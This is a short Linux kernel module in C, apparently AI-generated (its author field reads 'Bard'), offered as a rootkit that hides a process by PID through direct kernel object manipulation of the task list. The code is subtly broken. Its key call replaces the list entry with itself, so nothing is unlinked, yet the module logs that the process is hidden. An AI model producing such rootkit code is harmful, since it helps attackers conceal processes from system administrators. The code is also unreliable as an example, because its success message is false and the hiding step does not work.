#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Bard");
MODULE_DESCRIPTION("DKOM to hide a process");

static int pid_to_hide = 1234; //替换隐藏进程的PID值
module_param(pid_to_hide, int, 0644);
MODULE_PARM_DESC(pid_to_hide, "PID of the process to hide");

static int __init dkom_hide_init(void) {
    struct task_struct *task;
    struct list_head *prev, *next;

    printk(KERN_INFO "DKOM: Hiding process with PID: %d\n", pid_to_hide);

    for_each_process(task) {
        if (task->pid == pid_to_hide) {
            //在实际的Rootkit中，必须使用适当的锁定机制

            //获取指向列表中上一个和下一个元素的指针
            prev = task->tasks.prev;
            next = task->tasks.next;

            //更新上一个任务的“下一个”指针
            list_replace(&task->tasks, &task->tasks); //将条目替换为自身
            printk(KERN_INFO "DKOM: Process with PID %d hidden.\n", pid_to_hide);
            break;
        }
    }

    return 0;
}

static void __exit dkom_hide_exit(void) {
    printk(KERN_INFO "DKOM: Unhiding process is complex and not implemented. Reboot recommended.\n");
}

module_init(dkom_hide_init);
module_exit(dkom_hide_exit);
